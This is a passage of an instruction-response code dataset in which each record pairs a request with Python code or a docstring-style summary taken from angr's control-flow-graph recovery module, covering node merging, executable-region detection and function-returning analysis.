{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nmerge two adjacent CFGNodes into one.", "response": "def _merge_cfgnodes(self, cfgnode_0, cfgnode_1):\n        \"\"\"\n        Merge two adjacent CFGNodes into one.\n\n        :param CFGNode cfgnode_0:   The first CFGNode.\n        :param CFGNode cfgnode_1:   The second CFGNode.\n        :return:                    None\n        \"\"\"\n\n        assert cfgnode_0.addr + cfgnode_0.size == cfgnode_1.addr\n        addr0, addr1 = cfgnode_0.addr, cfgnode_1.addr\n        new_node = cfgnode_0.merge(cfgnode_1)\n\n        # Update the graph and the nodes dict accordingly\n        if addr1 in self._nodes_by_addr:\n            self._nodes_by_addr[addr1].remove(cfgnode_1)\n            if not self._nodes_by_addr[addr1]:\n                del self._nodes_by_addr[addr1]\n        del self._nodes[cfgnode_1.block_id]\n\n        self._nodes_by_addr[addr0].remove(cfgnode_0)\n        if not self._nodes_by_addr[addr0]:\n            del self._nodes_by_addr[addr0]\n        del self._nodes[cfgnode_0.block_id]\n\n        in_edges = list(self.graph.in_edges(cfgnode_0, data=True))\n        out_edges = list(self.graph.out_edges(cfgnode_1, data=True))\n\n        self.graph.remove_node(cfgnode_0)\n        self.graph.remove_node(cfgnode_1)\n\n        self.graph.add_node(new_node)\n        for src, _, data in in_edges:\n            self.graph.add_edge(src, new_node, **data)\n        for _, dst, data in out_edges:\n            self.graph.add_edge(new_node, dst, **data)\n\n        # Put the new node into node dicts\n        self._nodes[new_node.block_id] = new_node\n        self._nodes_by_addr[addr0].append(new_node)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _to_snippet(self, cfg_node=None, addr=None, size=None, thumb=False, jumpkind=None, base_state=None):\n\n        if cfg_node is not None:\n            addr = cfg_node.addr\n            size = cfg_node.size\n            thumb = cfg_node.thumb\n        else:\n            addr = addr\n            size = size\n            thumb = thumb\n\n        if addr is None:\n            raise ValueError('_to_snippet(): Either cfg_node or addr must be provided.')\n\n        if self.project.is_hooked(addr) and jumpkind != 'Ijk_NoHook':\n            hooker = self.project._sim_procedures[addr]\n            size = hooker.kwargs.get('length', 0)\n            return HookNode(addr, size, type(hooker))\n\n        if cfg_node is not None:\n            return BlockNode(addr, size, thumb=thumb, bytestr=cfg_node.byte_string)  # pylint: disable=no-member\n        else:\n            return self.project.factory.snippet(addr, size=size, jumpkind=jumpkind, thumb=thumb,\n                                                backup_state=base_state)", "response": "Convert a CFGNode instance to a CodeNode object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _arm_thumb_filter_jump_successors(self, addr, size, successors, get_ins_addr, get_exit_stmt_idx):\n\n        if not successors:\n            return [ ]\n\n        it_counter = 0\n        conc_temps = {}\n        can_produce_exits = set()\n        bb = self._lift(addr, size=size, thumb=True, opt_level=0)\n\n        for stmt in bb.vex.statements:\n            if stmt.tag == 'Ist_IMark':\n                if it_counter > 0:\n                    it_counter -= 1\n                    can_produce_exits.add(stmt.addr + stmt.delta)\n            elif stmt.tag == 'Ist_WrTmp':\n                val = stmt.data\n                if val.tag == 'Iex_Const':\n                    conc_temps[stmt.tmp] = val.con.value\n            elif stmt.tag == 'Ist_Put':\n                if stmt.offset == self.project.arch.registers['itstate'][0]:\n                    val = stmt.data\n                    if val.tag == 'Iex_RdTmp':\n                        if val.tmp in conc_temps:\n                            # We found an IT instruction!!\n                            # Determine how many instructions are conditional\n                            it_counter = 0\n                            itstate = conc_temps[val.tmp]\n                            while itstate != 0:\n                                it_counter += 1\n                                itstate >>= 8\n\n        if it_counter != 0:\n            l.debug('Basic block ends before calculated IT block (%#x)', addr)\n\n        THUMB_BRANCH_INSTRUCTIONS = ('beq', 'bne', 'bcs', 'bhs', 'bcc', 'blo', 'bmi', 'bpl', 'bvs',\n                                     'bvc', 'bhi', 'bls', 'bge', 'blt', 'bgt', 'ble', 'cbz', 'cbnz')\n        for cs_insn in bb.capstone.insns:\n            if cs_insn.mnemonic.split('.')[0] in THUMB_BRANCH_INSTRUCTIONS:\n                can_produce_exits.add(cs_insn.address)\n\n        successors_filtered = [suc for suc in successors\n                               if get_ins_addr(suc) in can_produce_exits or get_exit_stmt_idx(suc) == DEFAULT_STATEMENT]\n\n        return successors_filtered", "response": "Filter successors for THUMB mode basic blocks and remove those that won t be taken normally."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nchecking if the given memory region is extremely sparse.", "response": "def _is_region_extremely_sparse(self, start, end, base_state=None):\n        \"\"\"\n        Check whether the given memory region is extremely sparse, i.e., all bytes are the same value.\n\n        :param int start: The beginning of the region.\n        :param int end:   The end of the region.\n        :param base_state: The base state (optional).\n        :return:           True if the region is extremely sparse, False otherwise.\n        :rtype:            bool\n        \"\"\"\n\n        all_bytes = None\n\n        if base_state is not None:\n            all_bytes = base_state.memory.load(start, end - start + 1)\n            try:\n                all_bytes = base_state.solver.eval(all_bytes, cast_to=bytes)\n            except SimError:\n                all_bytes = None\n\n        size = end - start + 1\n\n        if all_bytes is None:\n            # load from the binary\n            all_bytes = self._fast_memory_load_bytes(start, size)\n\n        if all_bytes is None:\n            return True\n\n        if len(all_bytes) < size:\n            l.warning(\"_is_region_extremely_sparse: The given region %#x-%#x is not a continuous memory region in the \"\n                      \"memory space. Only the first %d bytes (%#x-%#x) are processed.\", start, end, len(all_bytes),\n                      start, start + len(all_bytes) - 1)\n\n        the_byte_value = None\n        for b in all_bytes:\n            if the_byte_value is None:\n                the_byte_value = b\n            else:\n                if the_byte_value != b:\n                    return False\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn True if we should skip the region False otherwise.", "response": "def _should_skip_region(self, region_start):\n        \"\"\"\n        Some regions usually do not contain any executable code, but are still marked as executable. We should skip\n        those regions by default.\n\n        :param int region_start: Address of the beginning of the region.\n        :return:                 True/False\n        :rtype:                  bool\n        \"\"\"\n\n        obj = self.project.loader.find_object_containing(region_start, membership_check=False)\n        if obj is None:\n            return False\n        if isinstance(obj, PE):\n            section = obj.find_section_containing(region_start)\n            if section is None:\n                return False\n            if section.name in {'.textbss'}:\n                return True\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _executable_memory_regions(self, objects=None, force_segment=False):\n\n        if objects is None:\n            binaries = self.project.loader.all_objects\n        else:\n            binaries = objects\n\n        memory_regions = [ ]\n\n        for b in binaries:\n            if isinstance(b, ELF):\n                # If we have sections, we get result from sections\n                if not force_segment and b.sections:\n                    # Get all executable sections\n                    for section in b.sections:\n                        if section.is_executable:\n                            tpl = (section.min_addr, section.max_addr)\n                            memory_regions.append(tpl)\n\n                else:\n                    # Get all executable segments\n                    for segment in b.segments:\n                        if segment.is_executable:\n                            tpl = (segment.min_addr, segment.max_addr)\n                            memory_regions.append(tpl)\n\n            elif isinstance(b, PE):\n                for section in b.sections:\n                    if section.is_executable:\n                        tpl = (section.min_addr, section.max_addr)\n                        memory_regions.append(tpl)\n\n            elif isinstance(b, MachO):\n                if b.segments:\n                    # Get all executable segments\n                    for seg in b.segments:\n                        if seg.is_executable:\n                            # Take all sections from this segment (MachO style)\n                            for section in seg.sections:\n                                tpl = (section.min_addr, section.max_addr)\n                                memory_regions.append(tpl)\n\n            elif isinstance(b, Blob):\n                # a blob is entirely executable\n                tpl = (b.min_addr, b.max_addr)\n                memory_regions.append(tpl)\n\n            elif isinstance(b, self._cle_pseudo_objects):\n                pass\n\n            else:\n                l.warning('Unsupported object format \"%s\". Treat it as an executable.', b.__class__.__name__)\n\n                tpl = (b.min_addr, b.max_addr)\n                memory_regions.append(tpl)\n\n        if not memory_regions:\n            memory_regions = [(start, start + len(backer)) for start, backer in self.project.loader.memory.backers()]\n\n        memory_regions = sorted(memory_regions, key=lambda x: x[0])\n\n        return memory_regions", "response": "Get all executable memory regions from the binaries."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ntest if the given address belongs to an executable memory region.", "response": "def _addr_in_exec_memory_regions(self, addr):\n        \"\"\"\n        Test if the address belongs to an executable memory region.\n\n        :param int addr: The address to test\n        :return: True if the address belongs to an exectubale memory region, False otherwise\n        :rtype: bool\n        \"\"\"\n\n        for start, end in self._exec_mem_regions:\n            if start <= addr < end:\n                return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ntesting if two addresses belong to the same section.", "response": "def _addrs_belong_to_same_section(self, addr_a, addr_b):\n        \"\"\"\n        Test if two addresses belong to the same section.\n\n        :param int addr_a:  The first address to test.\n        :param int addr_b:  The second address to test.\n        :return:            True if the two addresses belong to the same section or both of them do not belong to any\n                            section, False otherwise.\n        :rtype:             bool\n        \"\"\"\n\n        obj = self.project.loader.find_object_containing(addr_a, membership_check=False)\n\n        if obj is None:\n            # test if addr_b also does not belong to any object\n            obj_b = self.project.loader.find_object_containing(addr_b, membership_check=False)\n            if obj_b is None:\n                return True\n            return False\n\n        src_section = obj.find_section_containing(addr_a)\n        if src_section is None:\n            # test if addr_b also does not belong to any section\n            dst_section = obj.find_section_containing(addr_b)\n            if dst_section is None:\n                return True\n            return False\n\n        return src_section.contains_addr(addr_b)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck whether the given address belongs to a hook or a syscall.", "response": "def _addr_hooked_or_syscall(self, addr):\n        \"\"\"\n        Check whether the address belongs to a hook or a syscall.\n\n        :param int addr:    The address to check.\n        :return:            True if the address is hooked or belongs to a syscall. False otherwise.\n        :rtype:             bool\n        \"\"\"\n\n        return self.project.is_hooked(addr) or self.project.simos.is_syscall_addr(addr)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nperforms a fast memory loading of some data.", "response": "def _fast_memory_load_bytes(self, addr, length):\n        \"\"\"\n        Perform a fast memory loading of some data.\n\n        :param int addr: Address to read from.\n        :param int length: Size of the string to load.\n        :return:         A string or None if the address does not exist.\n        :rtype:          bytes or None\n        \"\"\"\n\n        try:\n            return self.project.loader.memory.load(addr, length)\n        except KeyError:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _fast_memory_load_pointer(self, addr, size=None):\n\n        try:\n            return self.project.loader.memory.unpack_word(addr, size=size)\n        except KeyError:\n            return None", "response": "Perform a fast memory loading of a pointer."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _determine_function_returning(self, func, all_funcs_completed=False):\n\n        # If there is at least one return site, then this function is definitely returning\n        if func.has_return:\n            return True\n\n        # Let's first see if it's a known SimProcedure that does not return\n        if self.project.is_hooked(func.addr):\n            procedure = self.project.hooked_by(func.addr)\n        else:\n            try:\n                procedure = self.project.simos.syscall_from_addr(func.addr, allow_unsupported=False)\n            except AngrUnsupportedSyscallError:\n                procedure = None\n\n        if procedure is not None and hasattr(procedure, 'NO_RET'):\n            return not procedure.NO_RET\n\n        # did we finish analyzing this function?\n        if not all_funcs_completed and func.addr not in self._completed_functions:\n            return None\n\n        if not func.block_addrs_set:\n            # there is no block inside this function\n            # it might happen if the function has been incorrectly identified as part of another function\n            # the error will be corrected during post-processing. In fact at this moment we cannot say anything\n            # about whether this function returns or not. We always assume it returns.\n            return True\n\n        bail_out = False\n\n        # if this function has jump-out sites or ret-out sites, it returns as long as any of the target function\n        # returns\n        for goout_site, type_ in [(site, 'jumpout') for site in func.jumpout_sites] + \\\n                                 [(site, 'retout') for site in func.retout_sites]:\n\n            # determine where it jumps/returns to\n            goout_site_successors = goout_site.successors()\n            if not goout_site_successors:\n                # not sure where it jumps to. bail out\n                bail_out = True\n                continue\n\n            # for ret-out sites, determine what function it calls\n            if type_ == 'retout':\n                # see whether the function being called returns or not\n                func_successors = [succ for succ in goout_site_successors if isinstance(succ, Function)]\n                if func_successors and all(func_successor.returning in (None, False)\n                                           for func_successor in func_successors):\n                    # the returning of all possible function calls are undetermined, or they do not return\n                    # ignore this site\n                    continue\n\n            if type_ == 'retout':\n                goout_target = next((succ for succ in goout_site_successors if not isinstance(succ, Function)), None)\n            else:\n                goout_target = next((succ for succ in goout_site_successors), None)\n            if goout_target is None:\n                # there is no jumpout site, which is weird, but what can we do...\n                continue\n            if not self.kb.functions.contains_addr(goout_target.addr):\n                # wait it does not jump to a function?\n                bail_out = True\n                continue\n\n            target_func = self.kb.functions[goout_target.addr]\n            if target_func.returning is True:\n                return True\n            elif target_func.returning is None:\n                # the returning status of at least one of the target functions is not decided yet.\n                bail_out = True\n\n        if bail_out:\n            # We cannot determine at this point. bail out\n            return None\n\n        # well this function does not return then\n        return False", "response": "Determines if a function returns or not."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nanalyzing the function features of functions in the function manager.", "response": "def _analyze_function_features(self, all_funcs_completed=False):\n        \"\"\"\n        For each function in the function_manager, try to determine if it returns or not. A function does not return if\n        it calls another function that is known to be not returning, and this function does not have other exits.\n\n        We might as well analyze other features of functions in the future.\n\n        :param bool all_funcs_completed:    Ignore _completed_functions set and treat all functions as completed. This\n                                            can be set to True after the entire CFG is built and _post_analysis() is\n                                            called (at which point analysis on all functions must be completed).\n        \"\"\"\n\n        changes = {\n            'functions_return': [],\n            'functions_do_not_return': []\n        }\n\n        if self._updated_nonreturning_functions is not None:\n            all_func_addrs = self._updated_nonreturning_functions\n\n            # Convert addresses to objects\n            all_functions = [ self.kb.functions.get_by_addr(f) for f in all_func_addrs\n                              if self.kb.functions.contains_addr(f) ]\n\n        else:\n            all_functions = list(self.kb.functions.values())\n\n        analyzed_functions = set()\n        # short-hand\n        functions = self.kb.functions  # type: angr.knowledge.FunctionManager\n\n        while all_functions:\n            func = all_functions.pop(-1)  # type: angr.knowledge.Function\n            analyzed_functions.add(func.addr)\n\n            if func.returning is not None:\n                # It has been determined before. Skip it\n                continue\n\n            returning = self._determine_function_returning(func, all_funcs_completed=all_funcs_completed)\n\n            if returning:\n                func.returning = True\n                changes['functions_return'].append(func)\n            elif returning is False:\n                func.returning = False\n                changes['functions_do_not_return'].append(func)\n\n            if returning is not None:\n                # Add all callers of this function to all_functions list\n                if func.addr in functions.callgraph:\n                    callers = functions.callgraph.predecessors(func.addr)\n                    for caller in callers:\n                        if caller in analyzed_functions:\n                            continue\n                        if functions.contains_addr(caller):\n                            all_functions.append(functions.get_by_addr(caller))\n\n        return changes"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef normalize(self):\n\n        graph = self.graph\n\n        smallest_nodes = { }  # indexed by end address of the node\n        end_addresses_to_nodes = defaultdict(set)\n\n        for n in graph.nodes():\n            if n.is_simprocedure:\n                continue\n            end_addr = n.addr + n.size\n            key = (end_addr, n.callstack_key)\n            # add the new item\n            end_addresses_to_nodes[key].add(n)\n\n        for key in list(end_addresses_to_nodes.keys()):\n            if len(end_addresses_to_nodes[key]) == 1:\n                smallest_nodes[key] = next(iter(end_addresses_to_nodes[key]))\n                del end_addresses_to_nodes[key]\n\n        while end_addresses_to_nodes:\n            key_to_find = (None, None)\n            for tpl, x in end_addresses_to_nodes.items():\n                if len(x) > 1:\n                    key_to_find = tpl\n                    break\n\n            end_addr, callstack_key = key_to_find\n            all_nodes = end_addresses_to_nodes[key_to_find]\n\n            all_nodes = sorted(all_nodes, key=lambda node: node.addr, reverse=True)\n            smallest_node = all_nodes[0] # take the one that has the highest address\n            other_nodes = all_nodes[1:]\n\n            self._normalize_core(graph, callstack_key, smallest_node, other_nodes, smallest_nodes,\n                                 end_addresses_to_nodes\n                                 )\n\n            del end_addresses_to_nodes[key_to_find]\n            # make sure the smallest node is stored in end_addresses\n            smallest_nodes[key_to_find] = smallest_node\n\n            # corner case\n            # sometimes two overlapping blocks may not be ending at the instruction. this might happen when one of the\n            # blocks (the bigger one) hits the instruction count limit or bytes limit before reaching the end address\n            # of the smaller block. in this case we manually pick up those blocks.\n            if not end_addresses_to_nodes:\n                # find if there are still overlapping blocks\n                sorted_smallest_nodes = defaultdict(list)  # callstack_key is the key of this dict\n                for k, node in smallest_nodes.items():\n                    _, callstack_key = k\n                    sorted_smallest_nodes[callstack_key].append(node)\n                for k in sorted_smallest_nodes.keys():\n                    sorted_smallest_nodes[k] = sorted(sorted_smallest_nodes[k], key=lambda node: node.addr)\n\n                for callstack_key, lst in sorted_smallest_nodes.items():\n                    lst_len = len(lst)\n                    for i, node in enumerate(lst):\n                        if i == lst_len - 1:\n                            break\n                        next_node = lst[i + 1]\n                        if node.addr <= next_node.addr < node.addr + node.size:\n                            # umm, those nodes are overlapping, but they must have different end addresses\n                            nodekey_a = node.addr + node.size, callstack_key\n                            nodekey_b = next_node.addr + next_node.size, callstack_key\n                            if nodekey_a == nodekey_b:\n                                # error handling: this will only happen if we have completely overlapping nodes\n                                # caused by different jumps (one of the jumps is probably incorrect), which usually\n                                # indicates an error in CFG recovery. we print a warning and skip this node\n                                l.warning(\"Found completely overlapping nodes %s. It usually indicates an error in CFG \"\n                                          \"recovery. Skip.\", node)\n                                continue\n\n                            if nodekey_a in smallest_nodes and nodekey_b in smallest_nodes:\n                                # misuse end_addresses_to_nodes\n                                end_addresses_to_nodes[(node.addr + node.size, callstack_key)].add(node)\n                                end_addresses_to_nodes[(node.addr + node.size, callstack_key)].add(next_node)\n\n                            smallest_nodes.pop(nodekey_a, None)\n                            smallest_nodes.pop(nodekey_b, None)\n\n        self._normalized = True", "response": "Normalizes the CFG making sure that there are no overlapping basic blocks."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a list of all functions that have finished analysis.", "response": "def _get_finished_functions(self):\n        \"\"\"\n        Obtain all functions of which we have finished analyzing. As _jobs_to_analyze_per_function is a defaultdict(),\n        if a function address shows up in it with an empty job list, we consider we have exhausted all jobs of this\n        function (both current jobs and pending jobs), thus the analysis of this function is done.\n\n        :return: a list of function addresses of that we have finished analysis.\n        :rtype:  list\n        \"\"\"\n\n        finished_func_addrs = [ ]\n        for func_addr, all_jobs in self._jobs_to_analyze_per_function.items():\n            if not all_jobs:\n                # great! we have finished analyzing this function!\n                finished_func_addrs.append(func_addr)\n\n        return finished_func_addrs"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _cleanup_analysis_jobs(self, finished_func_addrs=None):\n\n        if finished_func_addrs is None:\n            finished_func_addrs = self._get_finished_functions()\n\n        for func_addr in finished_func_addrs:\n            if func_addr in self._jobs_to_analyze_per_function:\n                del self._jobs_to_analyze_per_function[func_addr]", "response": "This function is called by _get_finished_functions to remove all functions of which we have finished analysis."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfilling in self. _completed_functions list and clean up job manager.", "response": "def _make_completed_functions(self):\n        \"\"\"\n        Fill in self._completed_functions list and clean up job manager.\n\n        :return: None\n        \"\"\"\n\n        finished = self._get_finished_functions()\n        for func_addr in finished:\n            self._completed_functions.add(func_addr)\n        self._cleanup_analysis_jobs(finished_func_addrs=finished)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nremoves all function alignments.", "response": "def remove_function_alignments(self):\n        \"\"\"\n        Remove all function alignments.\n\n        :return: None\n        \"\"\"\n\n        # This function requires Capstone engine support\n        if not self.project.arch.capstone_support:\n            return\n\n        for func_addr in self.kb.functions.keys():\n            function = self.kb.functions[func_addr]\n            if function.is_simprocedure or function.is_syscall:\n                continue\n            if len(function.block_addrs_set) == 1:\n                block = next((b for b in function.blocks), None)\n                if block is None:\n                    continue\n                if all(self._is_noop_insn(insn) for insn in block.capstone.insns):\n                    # remove this function\n                    l.debug('Function chunk %#x is used as function alignments. Removing it.', func_addr)\n                    del self.kb.functions[func_addr]"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef make_functions(self):\n\n        # TODO: Is it required that PLT stubs are always aligned by 16? If so, on what architectures and platforms is it\n        # TODO:  enforced?\n\n        tmp_functions = self.kb.functions.copy()\n\n        for function in tmp_functions.values():\n            function.mark_nonreturning_calls_endpoints()\n\n        # Clear old functions dict\n        self.kb.functions.clear()\n\n        blockaddr_to_function = { }\n        traversed_cfg_nodes = set()\n\n        function_nodes = set()\n\n        # Find nodes for beginnings of all functions\n        for _, dst, data in self.graph.edges(data=True):\n            jumpkind = data.get('jumpkind', \"\")\n            if jumpkind == 'Ijk_Call' or jumpkind.startswith('Ijk_Sys'):\n                function_nodes.add(dst)\n\n        entry_node = self.model.get_any_node(self._binary.entry)\n        if entry_node is not None:\n            function_nodes.add(entry_node)\n\n        # aggressively remove and merge functions\n        # For any function, if there is a call to it, it won't be removed\n        called_function_addrs = { n.addr for n in function_nodes }\n\n        removed_functions_a = self._process_irrational_functions(tmp_functions,\n                                                                 called_function_addrs,\n                                                                 blockaddr_to_function\n                                                                 )\n        removed_functions_b, adjusted_cfgnodes = self._process_irrational_function_starts(tmp_functions,\n                                                                                          called_function_addrs,\n                                                                                          blockaddr_to_function\n                                                                                          )\n        removed_functions = removed_functions_a | removed_functions_b\n\n        # Remove all nodes that are adjusted\n        function_nodes.difference_update(adjusted_cfgnodes)\n        for n in self.graph.nodes():\n            if n.addr in tmp_functions or n.addr in removed_functions:\n                function_nodes.add(n)\n\n        # traverse the graph starting from each node, not following call edges\n        # it's important that we traverse all functions in order so that we have a greater chance to come across\n        # rational functions before its irrational counterparts (e.g. due to failed jump table resolution)\n\n        min_stage_2_progress = 50.0\n        max_stage_2_progress = 90.0\n        nodes_count = len(function_nodes)\n        for i, fn in enumerate(sorted(function_nodes, key=lambda n: n.addr)):\n\n            if self._low_priority:\n                self._release_gil(i, 20)\n\n            if self._show_progressbar or self._progress_callback:\n                progress = min_stage_2_progress + (max_stage_2_progress - min_stage_2_progress) * (i * 1.0 / nodes_count)\n                self._update_progress(progress)\n\n            self._graph_bfs_custom(self.graph, [ fn ], self._graph_traversal_handler, blockaddr_to_function,\n                                   tmp_functions, traversed_cfg_nodes\n                                   )\n\n        # Don't forget those small function chunks that are not called by anything.\n        # There might be references to them from data, or simply references that we cannot find via static analysis\n\n        secondary_function_nodes = set()\n        # add all function chunks (\"functions\" that are not called from anywhere)\n        for func_addr in tmp_functions:\n            node = self.model.get_any_node(func_addr)\n            if node is None:\n                continue\n            if node.addr not in blockaddr_to_function:\n                secondary_function_nodes.add(node)\n\n        missing_cfg_nodes = set(self.graph.nodes()) - traversed_cfg_nodes\n        missing_cfg_nodes = { node for node in missing_cfg_nodes if node.function_address is not None }\n        if missing_cfg_nodes:\n            l.debug('%d CFGNodes are missing in the first traversal.', len(missing_cfg_nodes))\n            secondary_function_nodes |=  missing_cfg_nodes\n\n        min_stage_3_progress = 90.0\n        max_stage_3_progress = 99.9\n\n        nodes_count = len(secondary_function_nodes)\n        for i, fn in enumerate(sorted(secondary_function_nodes, key=lambda n: n.addr)):\n\n            if self._show_progressbar or self._progress_callback:\n                progress = min_stage_3_progress + (max_stage_3_progress - min_stage_3_progress) * (i * 1.0 / nodes_count)\n                self._update_progress(progress)\n\n            self._graph_bfs_custom(self.graph, [fn], self._graph_traversal_handler, blockaddr_to_function,\n                                   tmp_functions\n                                   )\n\n        to_remove = set()\n\n        # Remove all stubs after PLT entries\n        if not is_arm_arch(self.project.arch):\n            for fn in self.kb.functions.values():\n                addr = fn.addr - (fn.addr % 16)\n                if addr != fn.addr and addr in self.kb.functions and self.kb.functions[addr].is_plt:\n                    to_remove.add(fn.addr)\n\n        # remove empty functions\n        for func in self.kb.functions.values():\n            if func.startpoint is None:\n                to_remove.add(func.addr)\n\n        for addr in to_remove:\n            del self.kb.functions[addr]\n\n        # Update CFGNode.function_address\n        for node in self._nodes.values():\n            if node.addr in blockaddr_to_function:\n                node.function_address = blockaddr_to_function[node.addr].addr", "response": "Revisit the entire control flow graph and create Function instances accordingly."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _process_irrational_functions(self, functions, predetermined_function_addrs, blockaddr_to_function):\n\n        functions_to_remove = { }\n\n        functions_can_be_removed = set(functions.keys()) - set(predetermined_function_addrs)\n\n        for func_addr, function in functions.items():\n\n            if func_addr in functions_to_remove:\n                continue\n\n            # check all blocks and see if any block ends with an indirect jump and is not resolved\n            has_unresolved_jumps = False\n            # the functions to merge with must be locating between the unresolved basic block address and the endpoint\n            # of the current function\n            max_unresolved_jump_addr = 0\n            for block_addr in function.block_addrs_set:\n                if block_addr in self.indirect_jumps and \\\n                        self.indirect_jumps[block_addr].jumpkind == 'Ijk_Boring' and \\\n                        not self.indirect_jumps[block_addr].resolved_targets:\n                    # it's not resolved\n                    # we should also make sure it's a jump, not a call\n                    has_unresolved_jumps = True\n                    max_unresolved_jump_addr = max(max_unresolved_jump_addr, block_addr)\n\n            if not has_unresolved_jumps:\n                continue\n\n            if function.startpoint is None:\n                continue\n\n            startpoint_addr = function.startpoint.addr\n            if not function.endpoints:\n                # Function should have at least one endpoint\n                continue\n            endpoint_addr = max([ a.addr for a in function.endpoints ])\n            the_endpoint = next(a for a in function.endpoints if a.addr == endpoint_addr)\n            endpoint_addr += the_endpoint.size\n\n            # sanity check: startpoint of the function should be greater than its endpoint\n            if startpoint_addr >= endpoint_addr:\n                continue\n            if max_unresolved_jump_addr <= startpoint_addr or max_unresolved_jump_addr >= endpoint_addr:\n                continue\n\n            # scan forward from the endpoint to include any function tail jumps\n            # Here is an example:\n            # loc_8049562:\n            #       mov eax, ebp\n            #       add esp, 3ch\n            #       ...\n            #       ret\n            # loc_804956c:\n            #       mov ebp, 3\n            #       jmp loc_8049562\n            # loc_8049573:\n            #       mov ebp, 4\n            #       jmp loc_8049562\n            #\n            last_addr = endpoint_addr\n            tmp_state = self.project.factory.blank_state(mode='fastpath')\n            while True:\n                try:\n                    # using successors is slow, but acceptable since we won't be creating millions of blocks here...\n                    tmp_state.ip = last_addr\n                    b = self.project.factory.successors(tmp_state, jumpkind='Ijk_Boring')\n                    if len(b.successors) != 1:\n                        break\n                    if b.successors[0].history.jumpkind not in ('Ijk_Boring', 'Ijk_InvalICache'):\n                        break\n                    if b.successors[0].ip.symbolic:\n                        break\n                    suc_addr = b.successors[0].ip._model_concrete\n                    if max(startpoint_addr, the_endpoint.addr - 0x40) <= suc_addr < the_endpoint.addr + the_endpoint.size:\n                        # increment the endpoint_addr\n                        endpoint_addr = b.addr + b.artifacts['irsb_size']\n                    else:\n                        break\n\n                    last_addr = b.addr + b.artifacts['irsb_size']\n\n                except (SimTranslationError, SimMemoryError, SimIRSBError, SimEngineError):\n                    break\n\n            # find all functions that are between [ startpoint, endpoint ]\n\n            should_merge = True\n            functions_to_merge = set()\n            for f_addr in functions_can_be_removed:\n                f = functions[f_addr]\n                if f_addr == func_addr:\n                    continue\n                if max_unresolved_jump_addr < f_addr < endpoint_addr and \\\n                        all([max_unresolved_jump_addr < b_addr < endpoint_addr for b_addr in f.block_addrs]):\n                    if f_addr in functions_to_remove:\n                        # this function has already been merged with other functions before... it cannot be merged with\n                        # this function anymore\n                        should_merge = False\n                        break\n                    if f_addr in predetermined_function_addrs:\n                        # this function is a legit one. it shouldn't be removed/merged\n                        should_merge = False\n                        break\n                    functions_to_merge.add(f_addr)\n\n            if not should_merge:\n                # we shouldn't merge...\n                continue\n\n            for f_addr in functions_to_merge:\n                functions_to_remove[f_addr] = func_addr\n\n        # merge all functions\n        for to_remove, merge_with in functions_to_remove.items():\n            func_merge_with = self._addr_to_function(merge_with, blockaddr_to_function, functions)\n\n            for block_addr in functions[to_remove].block_addrs:\n                blockaddr_to_function[block_addr] = func_merge_with\n\n            del functions[to_remove]\n\n        return set(functions_to_remove.keys())", "response": "This method is used to remove functions that are not in the function manager and add them to the function manager."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nfunctions that are identified via function prologues can be starting after the actual beginning of the function. For example, the following function (with an incorrect start) might exist after a CFG recovery: sub_8049f70: push esi sub_8049f71: sub esp, 0A8h mov esi, [esp+0ACh+arg_0] mov [esp+0ACh+var_88], 0 If the following conditions are met, we will remove the second function and merge it into the first function: - The second function is not called by other code. - The first function has only one jumpout site, which points to the second function. - The first function and the second function are adjacent. :param FunctionManager functions: All functions that angr recovers. :return: A set of addresses of all removed functions. :rtype: set", "response": "def _process_irrational_function_starts(self, functions, predetermined_function_addrs, blockaddr_to_function):\n        \"\"\"\n        Functions that are identified via function prologues can be starting after the actual beginning of the function.\n        For example, the following function (with an incorrect start) might exist after a CFG recovery:\n\n        sub_8049f70:\n          push    esi\n\n        sub_8049f71:\n          sub     esp, 0A8h\n          mov     esi, [esp+0ACh+arg_0]\n          mov     [esp+0ACh+var_88], 0\n\n        If the following conditions are met, we will remove the second function and merge it into the first function:\n        - The second function is not called by other code.\n        - The first function has only one jumpout site, which points to the second function.\n        - The first function and the second function are adjacent.\n\n        :param FunctionManager functions:   All functions that angr recovers.\n        :return:                            A set of addresses of all removed functions.\n        :rtype:                             set\n        \"\"\"\n\n        addrs = sorted(k for k in functions.keys()\n                       if not self.project.is_hooked(k) and not self.project.simos.is_syscall_addr(k))\n        functions_to_remove = set()\n        adjusted_cfgnodes = set()\n\n        for addr_0, addr_1 in zip(addrs[:-1], addrs[1:]):\n            if addr_1 in predetermined_function_addrs:\n                continue\n\n            func_0 = functions[addr_0]\n\n            if len(func_0.block_addrs) == 1:\n                block = next(func_0.blocks)\n                if block.vex.jumpkind not in ('Ijk_Boring', 'Ijk_InvalICache'):\n                    continue\n                # Skip alignment blocks\n                if self._is_noop_block(self.project.arch, block):\n                    continue\n\n                target = block.vex.next\n                if isinstance(target, pyvex.IRExpr.Const):  # pylint: disable=unidiomatic-typecheck\n                    target_addr = target.con.value\n                elif type(target) in (pyvex.IRConst.U16, pyvex.IRConst.U32, pyvex.IRConst.U64):  # pylint: 